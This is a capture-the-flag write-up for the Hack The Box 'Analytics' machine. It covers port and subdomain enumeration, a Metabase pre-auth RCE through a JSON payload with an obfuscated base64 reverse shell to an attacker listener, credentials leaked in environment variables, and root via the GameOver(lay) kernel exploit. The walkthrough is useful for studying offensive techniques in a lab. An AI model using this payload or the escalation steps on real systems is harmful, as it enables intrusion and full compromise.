# HTB - Analytics

### TL;DR
This is an Ubuntu 22.04 host running an http server on port 80. The vulnerable web application running is metabase, and using the appropriate exploit rce can be gained. For escalation, a kernel vulnerability can be abused.

__Keywords:__<br>
metabase, GameOver(lay)
<br>
__References:__<br>
https://www.cvedetails.com/cve/CVE-2023-38646
https://www.cvedetails.com/cve/CVE-2023-2640
https://www.cvedetails.com/cve/CVE-2023-32629
https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
https://github.com/securezeron/CVE-2023-38646
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
<br>
<br>
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target --top-ports 1000 -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-08 15:15 EDT
Nmap scan report for analytical.htb (10.129.136.15)
Host is up, received user-set (0.35s latency).
Not shown: 569 filtered tcp ports (no-response), 429 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds
```
Discover hidden subdomains with `ffuf`
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 154  -t 100 -u http://analytical.htb -H "Host: FUZZ.analytical.htb" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://analytical.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.analytical.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 154
________________________________________________

data                    [Status: 200, Size: 77883, Words: 3574, Lines: 28]
```
Browsing the hidden subdomain at http/:data.analitycal.htb we find a login portal for a metabase service. Searching for metabase vulnerabilities we find out there is a vulnerability (https://www.cvedetails.com/cve/CVE-2023-38646) in the `/api/setup/validate` endpoint, which can lead to rce.
<br>
<br>
### PHASE 2. User
Search for a poc in github for this cve (https://github.com/securezeron/CVE-2023-38646). Analyzing the poc, we see first step is to obtain setup token, for this, just query the `/api/session/properties` endpoint and find `setup-token` field. Then, to obtain rce, we query the `api/setup/validate` endpoint with the setup token and the appropriate payload.
We can do this ourselves with burpsuite.

![analytics1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9512d67d-0565-48bb-8e77-cca05f62f8b9)

So the setup token is `"setup-token" : "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"`. For the payload, just use a base64 sh -i shell and query the endpoint building a post request with burpsuite.
```markdown
POST /api/setup/validate HTTP/1.1 Host: data.analytical.htb Content-Type: application/json Content-Length: 818 

{       "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
        "details":
        {
                "is_on_demand": false,
                "is_full_sync": false,
                "is_sample": false,
                "cache_ttl": null,
                "refingerprint": false,
                "auto_run_queries": true,
                "schedules":
                {},
                "details":
                {
                        "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjEvMTkxOSAwPiYxCg==}|{base64,-d}|{bash,-i}')\n$$--=x",
                        "advanced-options": false,
                        "ssl": true
                },
        "name": "an-sec-research-team",
        "engine": "h2"
        }
}
```

![analytics2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/440a1690-57fa-4ec2-9ab5-2568bcfec630)

If this does not work, just use the poc hardocding the shell in base64 within the poc source code and launch the exploit.
```markdown
> python3 exploit.py --rhost data.analytical.htb --lhost <listener ip> --lport 9001
```
After issuing the exploit, a sh shell is received on port 9001. Continue enumerating the system.
```markdown
> uname -a && cat /etc/os-release
Linux befd7ac0fb41 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 Linux
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.18.2
PRETTY_NAME="Alpine Linux v3.18"

> whoami && id
metabase
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
```
We are in some kind of limited ubuntu system, maybe a container. Looking around we find a script `/app/run_metabase.sh` to start the database where some env variables are manipulated, so let's enumerate environmental variables.
```markdown
> env
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=befd7ac0fb41
FC_LANG=en-US
SHLVL=4
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
OLDPWD=/opt
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=run_metabase.sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/app
MB_DB_FILE=//metabase.db/metabase.db
```
Clear text credentials are found here. So we can just login using them.
```markdown
> ssh metalytics@$target            
metalytics@10.129.136.15's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

Last login: Sat Oct  7 23:19:29 2023 from 10.10.14.80
metalytics@analytics:~$
```
<br>
<br>
### PHASE 3. System
Now we have a full shell out of the container. Enumerate system again.
```markdown
> uname -a && cat /proc/version
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2
```
Notice the system is Ubuntu 22.04 and kernel is 6.2.0. This release is vulnerable to GameOver(lay) Ubuntu Privilege Escalation (CVE-2023-2640 and CVE-2023-32629).
To escalate privileges, just download and execute exploit available in github (https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629).
After running the exploit, a root shell spawns.
```markdown
> -/exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned

> whoami
root
```


